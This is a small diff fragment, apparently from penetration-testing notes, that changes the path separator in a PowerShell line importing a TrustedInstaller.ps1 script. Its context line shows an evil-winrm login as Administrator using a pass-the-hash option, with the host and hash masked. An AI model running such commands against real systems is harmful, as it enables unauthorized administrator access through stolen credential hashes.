@@ -19,7 +19,7 @@ evil-winrm -i x.x.x.x -u Administrator -H 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 ```powershell
-Import-Module ./TrustedInstaller.ps1
+Import-Module .\TrustedInstaller.ps1
 ```
 
 ```powershell
